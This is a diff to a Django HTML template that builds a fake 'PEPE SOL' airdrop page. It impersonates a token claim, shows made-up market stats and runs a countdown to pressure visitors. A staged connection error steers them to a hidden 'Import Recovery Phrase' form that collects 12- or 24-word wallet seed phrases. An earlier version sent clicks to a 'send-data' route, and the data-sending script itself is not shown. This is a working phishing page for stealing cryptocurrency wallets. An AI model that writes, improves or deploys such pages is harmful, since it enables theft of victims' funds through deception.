@@ -4,24 +4,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOL Claim - Trust Wallet</title>
+    <title>PEPE SOL - The Ultimate Solana Meme Token</title>
     <link rel="stylesheet" href="{% static "style.css" %}">
 </head>
 <body>
-    <div class="container">
-        <div class="claim-card">
-            <div class="token-info">
-                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL" class="token-logo">
-                <h1>Claim Your SOL</h1>
+    <nav class="navbar">
+        <div class="nav-content">
+            <div class="nav-logo">
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL" class="nav-logo-img">
+                <span>PEPE SOL</span>
             </div>
-            <p class="claim-description">Connect your wallet to receive your SOL tokens</p>
-            <button id="claimButton" class="claim-button">Claim Now</button>
+            <div class="nav-links">
+                <a href="#about">About</a>
+                <a href="#tokenomics">Tokenomics</a>
+                <a href="#roadmap">Roadmap</a>
+                <button id="claimButton" class="nav-claim-btn">
+                    <span class="button-text">🎁 Claim Airdrop</span>
+                    <div class="loader"></div>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <div id="claimPage">
+        <div class="hero-section">
+            <div class="hero-content">
+                <h1>🐸 PEPE SOL 🐸</h1>
+                <p class="hero-subtitle">The Most Memeable Token on Solana</p>
+                <div class="token-amount">
+                    <div class="amount-label">Claim Your Airdrop</div>
+                    <div class="amount-value">
+                        <span class="amount">1,337</span>
+                        <span class="currency">SOL</span>
+                    </div>
+                </div>
+                <div class="button-group">
+                    <button class="main-claim-btn" id="mainClaimButton">
+                        <span class="button-text">Connect Wallet</span>
+                        <div class="loader"></div>
+                    </button>
+                    <button id="manualButton" class="manual-button">Connect Manually</button>
+                </div>
+                <div id="errorMessage" class="error-message">
+                    Unable to connect wallet automatically. Please use the "Connect Manually" option to proceed.
+                </div>
+                <div class="timer-container">
+                    <div class="timer-label">Airdrop Ends In:</div>
+                    <div class="timer" id="countdown">
+                        <div class="timer-item">
+                            <span class="time" id="hours">24</span>
+                            <span class="label">Hours</span>
+                        </div>
+                        <div class="timer-item">
+                            <span class="time" id="minutes">00</span>
+                            <span class="label">Minutes</span>
+                        </div>
+                        <div class="timer-item">
+                            <span class="time" id="seconds">00</span>
+                            <span class="label">Seconds</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="stats-section">
+            <div class="stat-card">
+                <div class="stat-value">$4.20M</div>
+                <div class="stat-label">Market Cap</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">69,420</div>
+                <div class="stat-label">Holders</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">420.69M</div>
+                <div class="stat-label">Total Supply</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">+42%</div>
+                <div class="stat-label">24h Change</div>
+            </div>
+        </div>
+
+        <div class="features-section">
+            <h2>Why PEPE SOL?</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🚀</div>
+                    <h3>Moon Mission</h3>
+                    <p>Built for the community, by the community. To the moon!</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>LP Locked</h3>
+                    <p>Liquidity locked for 69 years. Safe and secure.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎮</div>
+                    <h3>Gaming</h3>
+                    <p>P2E games coming soon. Play and earn $PSOL.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🌐</div>
+                    <h3>Web3 Ready</h3>
+                    <p>Built on Solana for lightning-fast transactions.</p>
+                </div>
+            </div>
         </div>
     </div>
-    <script>
+
+    <div id="recoveryPage" class="hidden">
+        <header>
+            <button class="back-button" id="backButton">←</button>
+            <h1>Import Recovery Phrase</h1>
+        </header>
+
+        <div class="warning-card">
+            <div class="warning-header">
+                <span class="shield-icon">🛡️</span>
+                <span class="warning-title">Security Warning</span>
+            </div>
+            <p>Never share your recovery phrase. Anyone with this phrase can steal your assets.</p>
+        </div>
+
+        <div class="phrase-input-container">
+            <div class="phrase-grid" id="phraseGrid"></div>
+        </div>
+
+        <div class="info-note">
+            <span class="info-icon">ℹ️</span>
+            <p>Recovery phrase should be 12 or 24 words long, each word separated by a single space.</p>
+        </div>
+
+        <button class="continue-button disabled" disabled>Continue</button>
+    </div>
+
+    <script src="{% static "script.js" %}"></script>
+    {% comment %} <script>
         document.getElementById("claimButton").addEventListener("click", function () {
             window.location.href = "{% url 'send-data' %}";
         });
-    </script>
+    </script> {% endcomment %}
 </body>
 </html>
